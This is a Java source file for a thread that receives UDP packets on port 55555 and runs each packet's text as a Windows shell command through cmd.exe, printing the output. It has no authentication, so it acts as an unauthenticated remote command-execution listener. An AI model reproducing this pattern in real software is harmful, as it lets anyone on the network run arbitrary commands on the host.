import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.*;

/**
 * Created by Андрей on 06.05.2016.
 */
public class ThreadReceiver extends Thread {

    public void run() {
        byte[] msg = new byte[2500];
        DatagramSocket ds = null;
        DatagramPacket dp;
        try {
            InetAddress address = InetAddress.getByName("192.168.1.120");
            ds = new DatagramSocket(55555, address);
            ds.setBroadcast(true);
            ds.setReuseAddress(true);
            while(true) {
                dp = new DatagramPacket(msg, msg.length);
                ds.receive(dp);
                //ds.setSoTimeout(10000);
                String text = new String(msg, 0, dp.getLength());
                ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/C", text);
                builder.redirectErrorStream(true);
                Process proc = builder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                String line = br.readLine();
                for (; line != null; line = br.readLine()) {
                    System.out.println(line);
                }
            }
        } catch (IOException e) {
            System.err.println(e.getMessage());
            return;
        } finally {
            if (ds != null) {
                ds.close();
            }
            System.exit(-1);
        }
    }
}
